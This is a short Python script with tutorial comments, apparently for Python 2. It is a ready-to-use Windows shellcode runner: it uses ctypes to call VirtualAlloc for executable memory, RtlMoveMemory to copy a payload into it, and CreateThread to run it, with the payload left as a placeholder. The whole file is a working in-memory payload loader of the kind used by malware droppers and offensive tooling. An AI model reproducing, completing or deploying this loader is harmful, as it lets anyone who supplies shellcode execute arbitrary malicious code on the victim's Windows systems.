#!/usr/bin/python
import ctypes

shellcode = bytearray("Your Shellcode")

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))
# VirtualAlloc() will allow us to create a new executable memory region and copy our shellcode to it, and after that execute it.
 
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(shellcode)))
# RtlMoveMemory() function accepts 3 arguments , a pointer to the destination (returned form virtualAlloc()), Pointer to the memory to be copied and the number of bytes to be copied.

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))
# CreateThread() accepts 6 arguments, In our case the third argument is very important.We need to pass a pointer to the application-defined function to be executed by the thread returned by VirtualAlloc().If the function succeeds, the return value is a handle to the new thread.
  
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
# WaitForSingleObject() function accepts 2 arguments 1st one is the handle to the object (Returned by CreateThread()) and the time-out interval, in milliseconds. If a nonzero value is specified, the function waits until the object is signaled or the interval elapses.
